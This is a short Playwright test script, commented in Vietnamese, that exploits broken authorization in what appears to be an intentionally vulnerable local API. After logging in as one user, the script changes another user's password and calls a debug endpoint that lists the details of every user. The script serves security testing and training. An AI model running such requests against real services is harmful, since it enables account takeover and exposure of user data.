
// Kịch bản 6: Khai thác lỗ hổng Broken object property level authorization

import { test, expect } from '@playwright/test';
import { PlaywrightTestConfig } from '@playwright/test';

test('Exploiting the Broken object property level authorization', async ({ request }) => {
    const login = await request.post(`/users/v1/login`, {
      data: {
        username: 'thieuhoa',
        password: 'test1'
      },
    });
    expect(login.ok()).toBeTruthy();
    const token = await login.json()
    let accessToken = token.auth_token
    const config: PlaywrightTestConfig = {
      use: {
        baseURL: 'http://localhost:5002',
        extraHTTPHeaders: {
          Authorization: `Bearer ${accessToken}`
        },
      },
    };

    await test.step("Update password", async () => {
        const updatePass = await request.put(`/users/v1/flower/password`, {
            headers:{
                Authorization: `Bearer ${accessToken}`
            },          
            data: {
                password : 'updated'
                },
            });    
      expect(updatePass.status()).toBe(200);
      //console.log(await updatePass.json());
    });
  
    await test.step("Displays all details for all users", async () => {
      const inforUser = await request.get(`/users/v1/_debug`);
    //     headers:{
    //       Authorization: `Bearer ${accessToken}`
    //     }
    //   });
      expect(inforUser.status()).toBe(200);
      console.log(await inforUser.json());
    });
});


